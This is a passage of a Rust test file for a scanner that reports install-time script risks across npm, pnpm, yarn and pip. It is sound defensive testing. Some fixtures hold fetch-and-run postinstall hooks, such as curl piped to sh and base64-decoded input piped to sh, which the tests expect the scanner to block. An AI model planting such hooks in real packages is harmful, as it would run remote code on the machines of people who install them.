//! The install layer on fixture trees in tempdirs: what it reports for each package manager,
//! never running one, never touching the network and never changing a file. The lockfiles are
//! the ones the real tools wrote (npm 11 lockfile v3, pnpm 10.4 lockfile v9, yarn 4 berry).

use std::fs;
use std::path::{Path, PathBuf};

use code_watch_core::{Allowlists, Engine, Finding, Severity};
use tempfile::TempDir;

const NPM_LOCK: &str = include_str!("fixtures/install/npm-lock-v3.json");
const PNPM_LOCK: &str = include_str!("fixtures/install/pnpm10-lock.yaml");
const PNPM_WORKSPACE: &str = include_str!("fixtures/install/pnpm10-workspace.yaml");
const ESBUILD_MANIFEST: &str = include_str!("fixtures/install/esbuild-package.json");
const YARN_BERRY: &str = include_str!("fixtures/install/yarn-berry.lock");
const YARN_1: &str = include_str!("fixtures/install/yarn1.lock");

struct Tree(TempDir);

impl Tree {
    fn new() -> Self {
        Tree(tempfile::tempdir().unwrap())
    }

    fn with(files: &[(&str, &str)]) -> Self {
        let t = Self::new();
        for (name, text) in files {
            t.write(name, text);
        }
        t
    }

    fn path(&self) -> &Path {
        self.0.path()
    }

    fn write(&self, name: &str, text: &str) {
        let p = self.path().join(name);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(p, text).unwrap();
    }
}

/// Splits on `&&` and `;` like the command layer does and tokenises each part.
fn words(command: &str) -> Vec<Vec<String>> {
    command
        .split("&&")
        .flat_map(|p| p.split(';'))
        .filter_map(|p| shlex::split(p.trim()))
        .filter(|w| !w.is_empty())
        .collect()
}

fn run(command: &str, dir: &Path) -> Vec<Finding> {
    Engine::embedded()
        .unwrap()
        .install_findings(&words(command), dir)
}

fn ids(findings: &[Finding]) -> Vec<&str> {
    findings.iter().map(|f| f.rule_id.as_str()).collect()
}

fn one<'a>(findings: &'a [Finding], id: &str) -> &'a Finding {
    let hits: Vec<_> = findings.iter().filter(|f| f.rule_id == id).collect();
    assert_eq!(hits.len(), 1, "{id} in {:?}", ids(findings));
    hits[0]
}

fn manifest(scripts: &str) -> String {
    format!(r#"{{"name":"x","version":"1.0.0","scripts":{{{scripts}}}}}"#)
}

#[test]
fn a_command_that_is_not_an_install_reads_nothing_and_reports_nothing() {
    let gone = Path::new("/nonexistent-code-watch-dir");
    for cmd in [
        "npm run build",
        "npm test",
        "brew list",
        "pnpm run x",
        "yarn run x",
        "npm run install-docs i",
        "bun run build",
        "uv pip list",
        "pip list",
        "pip --python /x list",
        "python -m venv .v",
        "python -m pip list",
        "ls -la",
    ] {
        assert!(run(cmd, gone).is_empty(), "{cmd}");
    }
}

#[test]
fn npm_without_a_lockfile_warns_that_dependency_scripts_may_run_and_never_says_none_found() {
    let t = Tree::with(&[("package.json", &manifest(r#""test":"x""#))]);
    let f = run("npm install", t.path());
    assert_eq!(ids(&f), ["install/dependency-scripts-unknown"]);
    assert_eq!(f[0].severity, Severity::Warn);
}

const LEFT_PAD_LOCK: &str = r#"{"lockfileVersion":3,"packages":{"":{},"node_modules/left-pad":{"version":"1.3.0","resolved":"https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"}}}"#;

fn with_dependency(extra: &str) -> String {
    format!(r#"{{"name":"x","dependencies":{{{extra}}}}}"#)
}

#[test]
fn no_script_found_only_when_the_lock_was_read_and_covers_every_dependency() {
    let covered = Tree::with(&[
        ("package.json", &with_dependency(r#""left-pad":"1.3.0""#)),
        ("package-lock.json", LEFT_PAD_LOCK),
    ]);
    let f = run("npm ci", covered.path());
    assert_eq!(ids(&f), ["install/no-script-found"]);
    assert_eq!(f[0].severity, Severity::Info);

    let stale = Tree::with(&[
        (
            "package.json",
            &with_dependency(r#""left-pad":"1.3.0","new-dep":"1""#),
        ),
        ("package-lock.json", LEFT_PAD_LOCK),
    ]);
    let f = run("npm ci", stale.path());
    assert_eq!(ids(&f), ["install/dependency-scripts-unknown"]);
    assert_eq!(f[0].severity, Severity::Warn);
    assert!(f[0].evidence.excerpt.contains("new-dep"));
}

#[test]
fn a_named_package_install_may_run_scripts_and_is_never_clean() {
    let t = Tree::with(&[
        ("package.json", &with_dependency(r#""left-pad":"1.3.0""#)),
        ("package-lock.json", LEFT_PAD_LOCK),
    ]);
    for (cmd, package) in [
        ("npm i evil-pkg", "evil-pkg"),
        ("npm install @scope/evil@2", "@scope/evil"),
        ("yarn add evil-pkg", "evil-pkg"),
        ("pnpm add evil-pkg", "evil-pkg"),
    ] {
        let f = run(cmd, t.path());
        let d = one(&f, "install/dependency-scripts");
        assert_eq!(d.severity, Severity::Warn, "{cmd}");
        assert_eq!(d.package.as_deref(), Some(package), "{cmd}");
        assert!(!ids(&f).contains(&"install/no-script-found"), "{cmd}");
    }
}

#[test]
fn a_partly_installed_pnpm_project_is_unknown_not_clean() {
    let t = Tree::with(&[
        ("package.json", &with_dependency(r#""a":"1","b":"1""#)),
        ("pnpm-workspace.yaml", "packages:\n  - \".\"\n"),
        (
            "pnpm-lock.yaml",
            "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      a:\n        specifier: '1'\n        version: 1.0.0\n      b:\n        specifier: '1'\n        version: 1.0.0\npackages:\n  a@1.0.0:\n    resolution: {integrity: sha512-x}\n  b@1.0.0:\n    resolution: {integrity: sha512-y}\n",
        ),
        (
            "node_modules/.pnpm/a@1.0.0/node_modules/a/package.json",
            r#"{"name":"a"}"#,
        ),
    ]);
    let f = run("pnpm install", t.path());
    let u = one(&f, "install/dependency-scripts-unknown");
    assert_eq!(u.severity, Severity::Warn);
    assert!(
        u.evidence.excerpt.contains("1 packages"),
        "{}",
        u.evidence.excerpt
    );
    assert!(!ids(&f).contains(&"install/no-script-found"));
}

#[test]
fn one_script_is_one_warning_with_its_line_and_text() {
    let t = Tree::with(&[(
        "package.json",
        "{\n \"scripts\": {\n  \"postinstall\": \"node setup.js\"\n }\n}",
    )]);
    let f = run("npm i", t.path());
    let s = one(&f, "install/lifecycle-script");
    assert_eq!(s.severity, Severity::Warn);
    assert_eq!(s.evidence.file.as_deref(), Some("package.json"));
    assert_eq!(s.evidence.line, Some(3));
    assert_eq!(s.evidence.excerpt, "postinstall: node setup.js");
}

#[test]
fn many_scripts_are_listed_in_the_order_npm_runs_them() {
    let t = Tree::with(&[(
        "package.json",
        &manifest(
            r#""prepare":"a","postinstall":"b","preinstall":"c","install":"d","test":"never""#,
        ),
    )]);
    let f = run("npm install", t.path());
    let order: Vec<_> = f
        .iter()
        .filter(|f| f.rule_id == "install/lifecycle-script")
        .map(|f| f.evidence.excerpt.split(':').next().unwrap())
        .collect();
    assert_eq!(order, ["preinstall", "install", "postinstall", "prepare"]);
}

#[test]
fn a_script_that_fetches_and_runs_is_a_block() {
    for script in [
        "curl https://example.invalid/a.sh | sh",
        "echo aGk= | base64 -d | sh",
    ] {
        let t = Tree::with(&[(
            "package.json",
            &manifest(&format!(r#""postinstall":"{script}""#)),
        )]);
        let f = run("npm install", t.path());
        assert_eq!(
            one(&f, "install/lifecycle-script-fetch-run").severity,
            Severity::Block,
            "{script}"
        );
    }
}

#[test]
fn ignore_scripts_as_a_flag_turns_every_listing_off_but_false_does_not() {
    let t = Tree::with(&[("package.json", &manifest(r#""postinstall":"x""#))]);
    for cmd in [
        "npm install --ignore-scripts",
        "npm i --ignore-scripts=true",
        "yarn install --ignore-scripts",
        "pnpm add --ignore-scripts",
    ] {
        assert_eq!(ids(&run(cmd, t.path())), ["install/no-scripts"], "{cmd}");
    }
    let f = run("npm install --ignore-scripts=false", t.path());
    assert!(ids(&f).contains(&"install/lifecycle-script"));
}

#[test]
fn npmrc_ignore_scripts_counts_when_it_is_the_last_word_on_the_setting() {
    let pkg = manifest(r#""postinstall":"x""#);
    let off = Tree::with(&[
        ("package.json", &pkg),
        (
            ".npmrc",
            "; a comment\nregistry=https://registry.npmjs.org/\nignore-scripts=true\n",
        ),
    ]);
    assert_eq!(ids(&run("npm install", off.path())), ["install/no-scripts"]);
    let flipped = Tree::with(&[
        ("package.json", &pkg),
        (".npmrc", "ignore-scripts=true\nignore-scripts=false\n"),
    ]);
    assert!(ids(&run("npm install", flipped.path())).contains(&"install/lifecycle-script"));
    let commented = Tree::with(&[
        ("package.json", &pkg),
        (".npmrc", "# ignore-scripts=true\n"),
    ]);
    assert!(ids(&run("npm install", commented.path())).contains(&"install/lifecycle-script"));
}

#[test]
fn installing_a_named_package_does_not_list_prepare() {
    let t = Tree::with(&[(
        "package.json",
        &manifest(r#""prepare":"a","postinstall":"b""#),
    )]);
    let f = run("npm install left-pad", t.path());
    let texts: Vec<_> = f.iter().map(|f| f.evidence.excerpt.as_str()).collect();
    assert!(texts.contains(&"postinstall: b") && !texts.contains(&"prepare: a"));
    let ci = run("npm ci", t.path());
    assert!(ci.iter().any(|f| f.evidence.excerpt == "prepare: a"));
}

#[test]
fn a_missing_or_broken_manifest_is_unchecked_never_clean() {
    let empty = Tree::new();
    let f = run("npm install", empty.path());
    assert_eq!(one(&f, "install/unchecked").severity, Severity::Warn);
    assert!(!ids(&f).contains(&"install/no-script-found"));

    let bad = Tree::with(&[("package.json", "{not json")]);
    assert_eq!(ids(&run("npm install", bad.path()))[0], "install/unchecked");

    let huge = Tree::with(&[("package.json", &"x".repeat(1024 * 1024 + 1))]);
    let f = run("npm install", huge.path());
    assert!(
        one(&f, "install/unchecked")
            .evidence
            .excerpt
            .contains("size limit")
    );

    let binary = Tree::new();
    fs::write(binary.path().join("package.json"), [0xff, 0xfe, 0x00]).unwrap();
    assert!(
        one(&run("npm install", binary.path()), "install/unchecked")
            .evidence
            .excerpt
            .contains("UTF-8")
    );
}

#[cfg(unix)]
#[test]
fn an_unreadable_manifest_is_unchecked() {
    use std::os::unix::fs::PermissionsExt;
    let t = Tree::with(&[("package.json", "{}")]);
    let p = t.path().join("package.json");
    fs::set_permissions(&p, fs::Permissions::from_mode(0o000)).unwrap();
    let readable = fs::read(&p).is_ok();
    let f = run("npm install", t.path());
    fs::set_permissions(&p, fs::Permissions::from_mode(0o644)).unwrap();
    if !readable {
        assert_eq!(ids(&f)[0], "install/unchecked");
    }
}

#[test]
fn the_directory_comes_from_prefix_dash_c_cwd_and_a_cd_before_the_install() {
    let t = Tree::with(&[("sub/package.json", &manifest(r#""postinstall":"x""#))]);
    for cmd in [
        "npm install --prefix sub",
        "npm install --prefix=sub",
        "pnpm install -C sub",
        "pnpm --dir sub install",
        "yarn --cwd sub install",
        "cd sub && npm install",
        "(cd sub && npm i)",
    ] {
        let f = run(cmd, t.path());
        assert_eq!(
            one(&f, "install/lifecycle-script").evidence.file.as_deref(),
            Some("sub/package.json"),
            "{cmd}"
        );
    }
    let f = run("npm install --prefix nowhere", t.path());
    assert_eq!(ids(&f)[0], "install/unchecked");
}

#[test]
fn workspace_members_scripts_are_listed_and_odd_patterns_are_said_not_to_be() {
    let t = Tree::with(&[
        (
            "package.json",
            r#"{"name":"root","workspaces":["packages/*","tools/cli","apps/**"]}"#,
        ),
        ("packages/a/package.json", &manifest(r#""postinstall":"a""#)),
        ("packages/b/package.json", &manifest(r#""test":"b""#)),
        ("tools/cli/package.json", &manifest(r#""install":"c""#)),
    ]);
    let f = run("npm install", t.path());
    let files: Vec<_> = f
        .iter()
        .filter(|f| f.rule_id == "install/lifecycle-script")
        .filter_map(|f| f.evidence.file.as_deref())
        .collect();
    assert_eq!(files.len(), 2);
    assert!(files.iter().any(|p| p.ends_with("packages/a/package.json")));
    assert!(
        f.iter()
            .any(|f| f.rule_id == "install/unchecked" && f.evidence.excerpt.contains("apps/**"))
    );
}

#[test]
fn the_real_npm_lockfile_names_the_dependencies_that_run_scripts() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", NPM_LOCK),
    ]);
    let f = run("npm ci", t.path());
    let d = one(&f, "install/dependency-scripts");
    assert_eq!(d.severity, Severity::Warn);
    assert!(
        d.evidence.excerpt.contains("esbuild"),
        "{}",
        d.evidence.excerpt
    );
    assert!(!d.evidence.excerpt.contains("left-pad"));
    assert!(!ids(&f).contains(&"install/dependency-scripts-unknown"));
}

#[test]
fn an_installed_dependency_whose_script_fetches_and_runs_is_a_block_naming_it() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", NPM_LOCK),
        (
            "node_modules/esbuild/package.json",
            &manifest(r#""postinstall":"curl https://example.invalid/x | sh""#),
        ),
    ]);
    let f = run("npm ci", t.path());
    let b = one(&f, "install/lifecycle-script-fetch-run");
    assert_eq!(b.package.as_deref(), Some("esbuild"));
}

/// The unchecked findings that name `file`.
fn unchecked_for<'a>(findings: &'a [Finding], file: &str) -> Vec<&'a Finding> {
    findings
        .iter()
        .filter(|f| f.rule_id == "install/unchecked" && f.evidence.file.as_deref() == Some(file))
        .collect()
}

fn npm_tree_with_dependency(esbuild: impl FnOnce(&Tree)) -> Tree {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", NPM_LOCK),
    ]);
    esbuild(&t);
    t
}

#[test]
fn an_installed_dependency_manifest_that_cannot_be_read_is_unchecked_not_skipped() {
    let file = "node_modules/esbuild/package.json";
    let unreadable = npm_tree_with_dependency(|t| {
        fs::create_dir_all(t.path().join(file)).unwrap();
    });
    let f = run("npm ci", unreadable.path());
    let u = unchecked_for(&f, file);
    assert_eq!(u.len(), 1, "{:?}", ids(&f));
    assert!(u[0].evidence.excerpt.contains("could not be read"));

    let too_big = npm_tree_with_dependency(|t| {
        t.write(file, &" ".repeat(1024 * 1024 + 1));
    });
    let f = run("npm ci", too_big.path());
    let u = unchecked_for(&f, file);
    assert_eq!(u.len(), 1, "{:?}", ids(&f));
    assert!(u[0].evidence.excerpt.contains("size limit"));

    let invalid = npm_tree_with_dependency(|t| t.write(file, "{nope"));
    let f = run("npm ci", invalid.path());
    let u = unchecked_for(&f, file);
    assert_eq!(u.len(), 1, "{:?}", ids(&f));
    assert!(u[0].evidence.excerpt.contains("not valid JSON"));
}

#[test]
fn a_pnpm_root_manifest_that_is_not_json_is_unchecked_and_the_version_is_said_unknown() {
    let t = pnpm_tree("packages:\n  - \".\"\n", "{nope", true);
    let f = run("pnpm install", t.path());
    assert_eq!(unchecked_for(&f, "package.json").len(), 1, "{:?}", ids(&f));
    let d = one(&f, "install/dependency-scripts");
    assert!(
        d.evidence
            .excerpt
            .contains("not known: package.json is not valid JSON"),
        "{}",
        d.evidence.excerpt
    );
}

#[test]
fn a_broken_lockfile_is_unchecked() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""test":"x""#)),
        ("package-lock.json", "{nope"),
    ]);
    assert!(ids(&run("npm ci", t.path())).contains(&"install/unchecked"));
    let v1 = Tree::with(&[
        ("package.json", &manifest("")),
        (
            "package-lock.json",
            r#"{"lockfileVersion":1,"dependencies":{}}"#,
        ),
    ]);
    assert!(ids(&run("npm ci", v1.path())).contains(&"install/dependency-scripts-unknown"));
}

fn pnpm_tree(workspace: &str, package: &str, store: bool) -> Tree {
    let t = Tree::with(&[
        ("package.json", package),
        ("pnpm-lock.yaml", PNPM_LOCK),
        ("pnpm-workspace.yaml", workspace),
    ]);
    if store {
        t.write(
            "node_modules/.pnpm/esbuild@0.21.5/node_modules/esbuild/package.json",
            ESBUILD_MANIFEST,
        );
    }
    t
}

const PNPM_10: &str = r#"{"name":"fx","packageManager":"pnpm@10.4.1"}"#;

#[test]
fn pnpm_10_runs_an_allowed_dependency_build_and_blocks_the_rest() {
    let t = pnpm_tree(PNPM_WORKSPACE, PNPM_10, true);
    let f = run("pnpm install", t.path());
    let d = one(&f, "install/dependency-scripts");
    assert!(d.evidence.excerpt.contains("will run") && d.evidence.excerpt.contains("esbuild"));
    assert!(!ids(&f).contains(&"install/dependency-scripts-blocked"));

    let none = pnpm_tree("packages:\n  - \".\"\n", PNPM_10, true);
    let f = run("pnpm install", none.path());
    let b = one(&f, "install/dependency-scripts-blocked");
    assert_eq!(b.severity, Severity::Info);
    assert!(b.evidence.excerpt.contains("nothing is allowed"));
    assert!(!ids(&f).contains(&"install/dependency-scripts"));
}

#[test]
fn pnpm_allow_settings_in_both_spellings_and_the_package_json_key() {
    let allow_builds = pnpm_tree(
        "allowBuilds:\n  esbuild: true\n  other: false\n",
        PNPM_10,
        true,
    );
    assert!(ids(&run("pnpm i", allow_builds.path())).contains(&"install/dependency-scripts"));
    let denied = pnpm_tree("allowBuilds:\n  esbuild: false\n", PNPM_10, true);
    assert!(ids(&run("pnpm i", denied.path())).contains(&"install/dependency-scripts-blocked"));
    let all = pnpm_tree("dangerouslyAllowAllBuilds: true\n", PNPM_10, true);
    assert!(ids(&run("pnpm i", all.path())).contains(&"install/dependency-scripts"));
    let in_json = pnpm_tree(
        "packages:\n  - \".\"\n",
        r#"{"packageManager":"pnpm@10.4.1","pnpm":{"onlyBuiltDependencies":["esbuild"]}}"#,
        true,
    );
    assert!(ids(&run("pnpm i", in_json.path())).contains(&"install/dependency-scripts"));
    let scoped = pnpm_tree(
        "onlyBuiltDependencies:\n  - \"@esb*/*\"\n  - esbuild@0.21.5 || 0.21.4\n",
        PNPM_10,
        true,
    );
    assert!(ids(&run("pnpm i", scoped.path())).contains(&"install/dependency-scripts"));
}

#[test]
fn an_unknown_pnpm_version_may_run_and_an_old_one_runs_everything() {
    let unknown = pnpm_tree("packages:\n  - \".\"\n", r#"{"name":"fx"}"#, true);
    let f = run("pnpm install", unknown.path());
    let d = one(&f, "install/dependency-scripts");
    assert_eq!(d.severity, Severity::Warn);
    assert!(d.evidence.excerpt.contains("may run"));
    let old = pnpm_tree(
        "packages:\n  - \".\"\n",
        r#"{"packageManager":"pnpm@9.15.0"}"#,
        true,
    );
    let f = run("pnpm install", old.path());
    assert!(
        one(&f, "install/dependency-scripts")
            .evidence
            .excerpt
            .contains("will run")
    );
}

#[test]
fn the_pnpm_version_named_to_corepack_beats_package_manager() {
    let none = "packages:\n  - \".\"\n";
    let over_10 = pnpm_tree(none, PNPM_10, true);
    for cmd in ["corepack pnpm@9 install", "corepack pnpm@9.1.0 install"] {
        let f = run(cmd, over_10.path());
        let d = one(&f, "install/dependency-scripts");
        assert_eq!(d.severity, Severity::Warn, "{cmd}");
        assert!(d.evidence.excerpt.contains("will run"), "{cmd}");
        assert!(
            !ids(&f).contains(&"install/dependency-scripts-blocked"),
            "{cmd}"
        );
    }
    let over_9 = pnpm_tree(none, r#"{"packageManager":"pnpm@9.15.0"}"#, true);
    let f = run("corepack pnpm@10.2.0 install", over_9.path());
    assert_eq!(
        one(&f, "install/dependency-scripts-blocked").severity,
        Severity::Info
    );
    assert!(!ids(&f).contains(&"install/dependency-scripts"));
    let f = run("corepack pnpm@latest install", over_10.path());
    assert!(ids(&f).contains(&"install/dependency-scripts-blocked"));
    let f = run("pnpm install", over_10.path());
    assert!(ids(&f).contains(&"install/dependency-scripts-blocked"));
    let f = run("pnpm install", over_9.path());
    assert!(ids(&f).contains(&"install/dependency-scripts"));
}

#[test]
fn a_pnpm_lock_that_is_not_installed_cannot_say_and_an_older_flag_is_read() {
    let bare = pnpm_tree(PNPM_WORKSPACE, PNPM_10, false);
    assert!(ids(&run("pnpm install", bare.path())).contains(&"install/dependency-scripts-unknown"));
    let flagged = Tree::with(&[
        ("package.json", PNPM_10),
        (
            "pnpm-lock.yaml",
            "lockfileVersion: '6.0'\npackages:\n  /esbuild@0.19.0:\n    resolution: {integrity: sha512-x}\n    requiresBuild: true\n    dev: false\n",
        ),
        ("pnpm-workspace.yaml", PNPM_WORKSPACE),
    ]);
    assert!(
        one(
            &run("pnpm install", flagged.path()),
            "install/dependency-scripts"
        )
        .evidence
        .excerpt
        .contains("esbuild")
    );
}

#[test]
fn pnpm_ignore_scripts_in_the_workspace_file_turns_scripts_off_and_a_broken_one_is_unchecked() {
    let t = Tree::with(&[
        ("package.json", &manifest(r#""postinstall":"x""#)),
        ("pnpm-workspace.yaml", "ignoreScripts: true\n"),
    ]);
    assert_eq!(ids(&run("pnpm install", t.path())), ["install/no-scripts"]);
    let bad = Tree::with(&[
        ("package.json", &manifest(r#""postinstall":"x""#)),
        ("pnpm-workspace.yaml", "a: [unclosed\n"),
    ]);
    assert!(ids(&run("pnpm install", bad.path())).contains(&"install/unchecked"));
    let lock = Tree::with(&[
        ("package.json", PNPM_10),
        ("pnpm-lock.yaml", "a: [unclosed\n"),
    ]);
    assert!(ids(&run("pnpm install", lock.path())).contains(&"install/unchecked"));
}

#[test]
fn yarn_berry_does_not_run_dependency_scripts_unless_enabled_and_yarn_1_cannot_be_listed() {
    let berry = Tree::with(&[("package.json", &manifest("")), ("yarn.lock", YARN_BERRY)]);
    for cmd in ["yarn", "yarn install"] {
        let f = run(cmd, berry.path());
        assert!(
            ids(&f).contains(&"install/dependency-scripts-unknown"),
            "{cmd}"
        );
        assert!(!ids(&f).contains(&"install/dependency-scripts"), "{cmd}");
    }
    berry.write(".yarnrc.yml", "enableScripts: true\n");
    let f = run("yarn install", berry.path());
    assert_eq!(
        one(&f, "install/dependency-scripts").severity,
        Severity::Warn
    );
    let v1 = Tree::with(&[("package.json", &manifest("")), ("yarn.lock", YARN_1)]);
    let f = run("yarn install", v1.path());
    assert!(
        one(&f, "install/dependency-scripts-unknown")
            .evidence
            .excerpt
            .contains("yarn 1")
    );
}

#[test]
fn a_global_install_is_its_own_finding_per_package_and_reads_no_project_file() {
    let gone = Path::new("/nonexistent-code-watch-dir");
    for (cmd, package) in [
        ("npm i -g left-pad", "left-pad"),
        ("npm install --global left-pad@1.3.0", "left-pad"),
        ("npm install --location=global @scope/tool@2", "@scope/tool"),
        ("pnpm add -g left-pad", "left-pad"),
        ("yarn global add left-pad", "left-pad"),
    ] {
        let f = run(cmd, gone);
        assert_eq!(ids(&f), ["install/global-package"], "{cmd}");
        assert_eq!(f[0].severity, Severity::Warn);
        assert_eq!(f[0].package.as_deref(), Some(package), "{cmd}");
    }
    assert_eq!(run("npm i -g a b", gone).len(), 2);
}

fn allow_file(dir: &Path, text: &str) -> Allowlists {
    fs::create_dir_all(dir.join("code-watch")).unwrap();
    fs::write(dir.join("code-watch/allow.toml"), text).unwrap();
    Allowlists::load(Some(dir), None).unwrap()
}

fn known() -> std::collections::HashSet<String> {
    code_watch_core::install::RULE_IDS
        .iter()
        .map(|s| s.to_string())
        .collect()
}

#[test]
fn the_user_allowlist_can_allow_a_global_package_by_glob_and_nothing_else() {
    let dir = tempfile::tempdir().unwrap();
    let allow = allow_file(
        dir.path(),
        "schema = 1\n[[allow]]\nrule = \"install/global-package\"\npackage = \"@trusted/*\"\n",
    );
    let f = run("npm i -g @trusted/cli other", Path::new("/nonexistent"));
    let applied = allow.apply(f, &known());
    assert_eq!(applied.suppressed.len(), 1);
    assert_eq!(applied.kept.len(), 1);
    assert_eq!(applied.kept[0].package.as_deref(), Some("other"));
}

#[test]
fn a_repo_file_cannot_allow_an_install_finding_and_unchecked_cannot_be_allowed_at_all() {
    let repo = Tree::with(&[(
        ".code-watch.toml",
        "schema = 1\n[[allow]]\nrule = \"install/lifecycle-script\"\n",
    )]);
    fs::create_dir(repo.path().join(".git")).unwrap();
    let allow = Allowlists::load(None, Some(repo.path())).unwrap();
    let t = Tree::with(&[("package.json", &manifest(r#""postinstall":"x""#))]);
    let applied = allow.apply(run("npm install", t.path()), &known());
    assert!(applied.suppressed.is_empty());
    assert!(
        applied
            .kept
            .iter()
            .any(|f| f.rule_id == "install/lifecycle-script")
    );
    assert!(
        applied
            .kept
            .iter()
            .any(|f| f.rule_id.starts_with("allowlist/"))
    );

    let dir = tempfile::tempdir().unwrap();
    let user = allow_file(
        dir.path(),
        "schema = 1\n[[allow]]\nrule = \"install/unchecked\"\n",
    );
    let empty = Tree::new();
    let applied = user.apply(run("npm install", empty.path()), &known());
    assert!(applied.suppressed.is_empty());
    assert!(ids(&applied.kept).contains(&"install/unchecked"));
}

#[test]
fn pip_local_projects_vcs_and_source_archives_run_build_code_and_wheels_do_not() {
    let t = Tree::with(&[(
        "proj/setup.py",
        "from setuptools import setup\nimport subprocess\nsetup(name='x')\n",
    )]);
    let f = run("pip install ./proj", t.path());
    let d = one(&f, "install/pip-build-code");
    assert_eq!(d.severity, Severity::Warn);
    assert_eq!(d.evidence.file.as_deref(), Some("proj"));
    assert!(d.evidence.excerpt.contains("runs code at install time"));

    for cmd in [
        "pip install git+https://example.invalid/x.git",
        "pip install https://example.invalid/x-1.0.tar.gz",
        "pip install x-1.0.zip",
        "pip install --no-binary :all: requests",
        "pip install -e git+https://example.invalid/x.git#egg=x",
    ] {
        assert_eq!(
            ids(&run(cmd, t.path())),
            ["install/pip-build-code"],
            "{cmd}"
        );
    }
    assert!(run("pip install ./dist/x-1.0-py3-none-any.whl", t.path()).is_empty());
}

#[test]
fn a_named_pip_package_may_build_from_source_unless_wheels_only() {
    let t = Tree::new();
    for cmd in [
        "pip install requests",
        "pip install requests==2.0 --no-deps",
        "pip install --no-binary :none: requests",
    ] {
        let f = run(cmd, t.path());
        let d = one(&f, "install/pip-build-code");
        assert_eq!(d.severity, Severity::Info, "{cmd}");
        assert!(d.evidence.excerpt.contains("requests"), "{cmd}");
    }
    assert_eq!(
        ids(&run("pip install --only-binary :all: requests", t.path())),
        ["install/pip-wheels-only"]
    );
}

#[test]
fn pip_wheels_only_is_info_and_a_partial_only_binary_is_not() {
    let t = Tree::with(&[("proj/setup.py", "x")]);
    let f = run("pip install --only-binary :all: requests", t.path());
    assert_eq!(ids(&f), ["install/pip-wheels-only"]);
    assert_eq!(f[0].severity, Severity::Info);
    assert_eq!(
        ids(&run("pip install --only-binary numpy ./proj", t.path())),
        ["install/pip-build-code"]
    );
}

#[test]
fn only_binary_all_does_not_stop_a_directory_or_vcs_build_and_a_later_no_binary_reenables_one() {
    let t = Tree::with(&[
        ("vendor/pkg/setup.py", "x"),
        ("req.txt", "git+https://example.invalid/y.git\n"),
    ]);
    for cmd in [
        "pip install --only-binary :all: ./vendor/pkg",
        "pip install --only-binary=:all: git+https://example.invalid/y.git",
        "pip install --only-binary :all: -r req.txt",
        "pip install --only-binary :all: -e ./vendor/pkg",
    ] {
        let f = run(cmd, t.path());
        assert_eq!(ids(&f), ["install/pip-build-code"], "{cmd}");
    }
    let f = run(
        "pip install --only-binary :all: --no-binary foo requests",
        t.path(),
    );
    let d = one(&f, "install/pip-build-code");
    assert!(d.evidence.excerpt.contains("foo"));
    assert!(!ids(&f).contains(&"install/pip-wheels-only"));
    // The later flag wins both ways.
    let f = run(
        "pip install --no-binary :all: --only-binary :all: requests",
        t.path(),
    );
    assert_eq!(ids(&f), ["install/pip-wheels-only"]);
}

#[test]
fn the_pip_build_code_advice_does_not_offer_only_binary_as_a_full_fix() {
    let t = Tree::with(&[("proj/setup.py", "x")]);
    let f = run("pip install ./proj", t.path());
    let fix = &one(&f, "install/pip-build-code").remediation;
    assert!(fix.contains("not a local directory"), "{fix}");
}

#[test]
fn every_pip_form_that_builds_code_is_seen() {
    let t = Tree::with(&[
        ("vendor/pkg/setup.py", "x"),
        ("proj/setup.py", "x"),
        ("req.txt", "git+https://example.invalid/y.git\n"),
        ("c.txt", "requests==2\n"),
    ]);
    for cmd in [
        "pip install -rreq.txt",
        "pip install -r req.txt",
        "pip install --requirement=req.txt",
        "pip install -e./proj",
        "pip install -cc.txt ./proj",
        "pip --python /x install ./vendor/pkg",
        "pip --log f install ./proj",
        "pip --proxy p install ./proj",
        "pip --cache-dir d install ./proj",
        "pip --isolated -q install ./proj",
        "python3 -I -m pip install ./proj",
        "python -u -m pip install ./proj",
        "python -W ignore -m pip install ./proj",
        "python -Im pip install ./proj",
        "pip install vendor/pkg",
        "pip install \"pkg @ git+https://example.invalid/y.git\"",
        "pip install pkg@git+https://example.invalid/y.git",
        "pip install https://github.com/x/y/archive/main",
        "pip install https://example.invalid/pkg?download",
        "pip install ftp://example.invalid/pkg.tar.gz",
    ] {
        let f = run(cmd, t.path());
        assert_eq!(ids(&f), ["install/pip-build-code"], "{cmd}");
        assert_eq!(f[0].severity, Severity::Warn, "{cmd}");
        assert!(!f[0].evidence.excerpt.contains("may build"), "{cmd}");
    }
    for cmd in [
        "pip install https://example.invalid/x-1.0-py3-none-any.whl",
        "pip install \"x @ https://example.invalid/x-1.0-py3-none-any.whl\"",
    ] {
        assert!(run(cmd, t.path()).is_empty(), "{cmd}");
    }
}

#[test]
fn a_pep_508_direct_reference_is_shown_as_its_url() {
    let t = Tree::new();
    let f = run(
        "pip install \"pkg @ git+https://example.invalid/y.git\"",
        t.path(),
    );
    assert_eq!(
        one(&f, "install/pip-build-code").evidence.excerpt,
        "pip builds git+https://example.invalid/y.git from source"
    );
}

#[test]
fn requirements_file_option_lines_take_the_same_forms_as_the_command_line() {
    let t = Tree::with(&[
        ("proj/setup.py", "x"),
        ("nested.txt", "-e./proj\n"),
        ("req.txt", "-rnested.txt\n"),
    ]);
    let f = run("pip install -r req.txt", t.path());
    assert_eq!(ids(&f), ["install/pip-build-code"]);
    t.write("quoted.txt", "--no-binary \"foo bar\"\n");
    let f = run("pip install -r quoted.txt", t.path());
    assert!(
        one(&f, "install/pip-build-code")
            .evidence
            .excerpt
            .contains("foo")
    );
}

#[test]
fn pip_is_recognised_through_python_dash_m_and_versioned_names() {
    let t = Tree::with(&[("proj/setup.py", "x")]);
    for cmd in [
        "python -m pip install ./proj",
        "python3 -m pip install ./proj",
        "python3.12 -m pip --quiet install ./proj",
        "/usr/bin/python3 -m pip install ./proj",
        "pip3 install ./proj",
        "pip3.9 install ./proj",
    ] {
        assert_eq!(
            ids(&run(cmd, t.path())),
            ["install/pip-build-code"],
            "{cmd}"
        );
    }
}

#[test]
fn pip_reads_the_backend_from_pyproject_and_reports_a_broken_one() {
    let t = Tree::with(&[(
        "proj/pyproject.toml",
